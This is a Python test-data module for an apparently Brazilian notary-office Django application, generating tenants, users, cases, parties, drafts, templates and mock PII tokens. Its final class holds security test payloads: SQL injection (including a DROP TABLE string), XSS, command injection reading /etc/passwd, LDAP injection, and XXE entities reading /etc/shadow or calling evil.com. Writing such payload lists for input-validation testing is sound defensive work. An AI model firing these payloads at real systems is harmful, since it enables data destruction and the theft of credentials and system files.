"""
Test data generators and utilities.
"""
import hashlib
import uuid
from typing import Dict, List, Any

from django.contrib.auth import get_user_model
from django.db import transaction

from apps.tenancy.models import Tenant
from apps.processos.models import Processo
from apps.partes.models import Parte
from apps.documentos.models import Documento, Minuta, DocumentTemplate

from .factories import (
    TenantFactory, UserFactory, ProcessoFactory, ParteFactory,
    DocumentTemplateFactory, MinutaFactory, DocumentoFactory,
    AdminUserFactory, InactiveUserFactory, ProcessoWithMinutasFactory,
    MinutaRascunhoFactory, MinutaAprovadoFactory, MinutaFinalizadoFactory,
    PartePessoaFisicaFactory, PartePessoaJuridicaFactory
)

User = get_user_model()


class TestDataGenerator:
    """Utility class for generating comprehensive test data."""
    
    @staticmethod
    def create_test_tenants(count: int = 10) -> List[Tenant]:
        """Create test tenants with unique names."""
        tenants = []
        for i in range(count):
            tenant = TenantFactory(nome=f"Cartório Teste {i+1}")
            tenants.append(tenant)
        return tenants
    
    @staticmethod
    def create_test_users(tenant: Tenant, count: int = 5) -> List[User]:
        """Create test users for a tenant."""
        users = []
        for i in range(count):
            user = UserFactory(username=f"user_{tenant.id}_{i+1}")
            users.append(user)
        return users
    
    @staticmethod
    def create_test_processos(tenant: Tenant, count: int = 20) -> List[Processo]:
        """Create test processos for a tenant."""
        processos = []
        for i in range(count):
            processo = ProcessoFactory(
                tenant=tenant,
                numero=f"PROC-{tenant.id}-{i+1:04d}"
            )
            processos.append(processo)
        return processos
    
    @staticmethod
    def create_test_partes(tenant: Tenant, count: int = 40) -> List[Parte]:
        """Create test partes with mock PII tokens."""
        partes = []
        for i in range(count):
            # Alternate between PF and PJ
            if i % 2 == 0:
                parte = PartePessoaFisicaFactory(tenant=tenant)
            else:
                parte = PartePessoaJuridicaFactory(tenant=tenant)
            partes.append(parte)
        return partes
    
    @staticmethod
    def create_test_minutas(processo: Processo, count: int = 3) -> List[Minuta]:
        """Create test minutas for a processo."""
        minutas = []
        for i in range(count):
            minuta = MinutaFactory(
                tenant=processo.tenant,
                processo=processo,
                versao=i + 1
            )
            minutas.append(minuta)
        return minutas
    
    @staticmethod
    def create_test_documentos(processo: Processo, count: int = 2) -> List[Documento]:
        """Create test documentos for a processo."""
        documentos = []
        for i in range(count):
            documento = DocumentoFactory(
                tenant=processo.tenant,
                processo=processo
            )
            documentos.append(documento)
        return documentos
    
    @staticmethod
    def create_test_templates(tenant: Tenant) -> List[DocumentTemplate]:
        """Create default document templates for a tenant."""
        template_types = ['procuracao', 'certidao', 'testamento', 'escritura', 'contrato']
        templates = []
        
        for template_type in template_types:
            template = DocumentTemplateFactory(
                tenant=tenant,
                name=template_type,
                document_type=template_type,
                template_path=f"documentos/{template_type}.html",
                is_default=True
            )
            templates.append(template)
        
        return templates
    
    @staticmethod
    def create_comprehensive_test_data() -> Dict[str, Any]:
        """Create comprehensive test data for all scenarios."""
        with transaction.atomic():
            # Create tenants
            tenants = TestDataGenerator.create_test_tenants(10)
            
            # Create users for each tenant
            all_users = []
            for tenant in tenants:
                users = TestDataGenerator.create_test_users(tenant, 5)
                all_users.extend(users)
            
            # Create admin user
            admin_user = AdminUserFactory(username="admin")
            all_users.append(admin_user)
            
            # Create inactive user
            inactive_user = InactiveUserFactory(username="inactive")
            all_users.append(inactive_user)
            
            # Create processos for each tenant
            all_processos = []
            for tenant in tenants:
                processos = TestDataGenerator.create_test_processos(tenant, 10)
                all_processos.extend(processos)
            
            # Create partes for each tenant
            all_partes = []
            for tenant in tenants:
                partes = TestDataGenerator.create_test_partes(tenant, 20)
                all_partes.extend(partes)
            
            # Create minutas for some processos
            all_minutas = []
            for processo in all_processos[:50]:  # Only first 50 processos
                minutas = TestDataGenerator.create_test_minutas(processo, 2)
                all_minutas.extend(minutas)
            
            # Create documentos for some processos
            all_documentos = []
            for processo in all_processos[:30]:  # Only first 30 processos
                documentos = TestDataGenerator.create_test_documentos(processo, 1)
                all_documentos.extend(documentos)
            
            # Create templates for each tenant
            all_templates = []
            for tenant in tenants:
                templates = TestDataGenerator.create_test_templates(tenant)
                all_templates.extend(templates)
            
            return {
                'tenants': tenants,
                'users': all_users,
                'admin_user': admin_user,
                'inactive_user': inactive_user,
                'processos': all_processos,
                'partes': all_partes,
                'minutas': all_minutas,
                'documentos': all_documentos,
                'templates': all_templates
            }


class MockPIIData:
    """Mock PII data for testing tokenization."""
    
    MOCK_PII_TOKENS = {
        'nome': 'token_12345678-1234-1234-1234-123456789012',
        'cpf': 'token_87654321-4321-4321-4321-210987654321',
        'cnpj': 'token_11111111-2222-3333-4444-555555555555',
        'endereco': 'token_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
        'email': 'token_ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj',
        'telefone': 'token_kkkkkkkk-llll-mmmm-nnnn-oooooooooooo'
    }
    
    MOCK_PII_HASHES = {
        'nome': hashlib.sha256('João Silva Santos'.encode()).digest(),
        'cpf': hashlib.sha256('123.456.789-00'.encode()).digest(),
        'cnpj': hashlib.sha256('12.345.678/0001-90'.encode()).digest(),
        'endereco': hashlib.sha256('Rua das Flores, 123, Centro, Rio de Janeiro - RJ'.encode()).digest(),
        'email': hashlib.sha256('joao.silva@email.com'.encode()).digest(),
        'telefone': hashlib.sha256('(21) 99999-9999'.encode()).digest()
    }
    
    @staticmethod
    def get_mock_token(field: str) -> str:
        """Get mock token for a PII field."""
        return MockPIIData.MOCK_PII_TOKENS.get(field, f"token_{uuid.uuid4()}")
    
    @staticmethod
    def get_mock_hash(field: str) -> bytes:
        """Get mock hash for a PII field."""
        return MockPIIData.MOCK_PII_HASHES.get(field, hashlib.sha256(f"mock_{field}".encode()).digest())


class SecurityTestPayloads:
    """Security test payloads for various attack vectors."""
    
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "1' OR '1'='1' AND '1'='1",
        "1' OR '1'='1' LIMIT 1 --",
        "1' OR '1'='1' ORDER BY 1 --",
        "1' OR '1'='1' GROUP BY 1 --",
        "1' OR '1'='1' HAVING 1=1 --",
        "1' OR '1'='1' UNION SELECT 1,2,3 --"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>"
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "|| id",
        "; cat /etc/passwd",
        "| whoami",
        "&& cat /etc/hosts",
        "|| ls -la",
        "; id",
        "| ps aux",
        "&& netstat -an",
        "|| cat /proc/version",
        "; uname -a",
        "| df -h",
        "&& free -m"
    ]
    
    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*)(&",
        "*)(|",
        "*)(uid=*",
        "*)(|(uid=*",
        "*)(|(objectClass=*",
        "*)(|(cn=*",
        "*)(|(mail=*",
        "*)(|(sn=*",
        "*)(|(givenName=*"
    ]
    
    XML_INJECTION_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><foo>&xxe;</foo>"
    ]
    
    @staticmethod
    def get_all_payloads() -> Dict[str, List[str]]:
        """Get all security test payloads."""
        return {
            'sql_injection': SecurityTestPayloads.SQL_INJECTION_PAYLOADS,
            'xss': SecurityTestPayloads.XSS_PAYLOADS,
            'command_injection': SecurityTestPayloads.COMMAND_INJECTION_PAYLOADS,
            'ldap_injection': SecurityTestPayloads.LDAP_INJECTION_PAYLOADS,
            'xml_injection': SecurityTestPayloads.XML_INJECTION_PAYLOADS
        }
